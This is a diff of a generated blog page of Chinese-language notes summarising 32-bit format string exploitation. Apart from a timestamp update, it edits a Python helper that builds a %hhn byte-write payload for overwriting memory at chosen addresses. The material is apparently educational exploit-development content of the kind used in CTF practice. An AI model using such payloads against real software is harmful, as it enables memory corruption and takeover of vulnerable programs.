@@ -92,7 +92,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/2019/02/12/32位-格式化串漏洞利用总结/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/02/12/32位-格式化串漏洞利用总结/2.png">
-<meta property="og:updated_time" content="2019-02-12T13:02:54.374Z">
+<meta property="og:updated_time" content="2019-02-12T13:18:05.683Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="32位-格式化串漏洞利用总结">
 <meta name="twitter:description" content="这篇笔记总结下32位下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。32位格式化字符串漏洞的利用，往往就两点：泄露内存，修改内存。  %x:   他可以将对应参数的值以16进制打印出来，%x只能打印4个字节，%lx或者%llx可以打8个字节。如%x表示要泄漏对应偏移4字节长度的16进制数据，%llx表示要泄漏对应偏移8字节长度的16进制数据。 %s：可以">
@@ -365,9 +365,9 @@ def modify(target,offset,old):
 
     payload=p32(old)+p32(old+1)+p32(old+2)+p32(old+3)
     len1=get(t1,len(payload))
-    len2=get(t2,t1)
-    len3=get(t3,t2)
-    len4=get(t4,t3)
+    len2=get(t2,(len1)+16)
+    len3=get(t3,(len2+len1)+16)
+    len4=get(t4,(len3+len2+len1)+16)
     payload+=&apos;%&apos;+str(len1)+&apos;c&apos;+&apos;%&apos;+str(offset)+&apos;$hhn&apos;
     payload+=&apos;%&apos;+str(len2)+&apos;c&apos;+&apos;%&apos;+str(offset+1)+&apos;$hhn&apos;
     payload+=&apos;%&apos;+str(len3)+&apos;c&apos;+&apos;%&apos;+str(offset+2)+&apos;$hhn&apos;
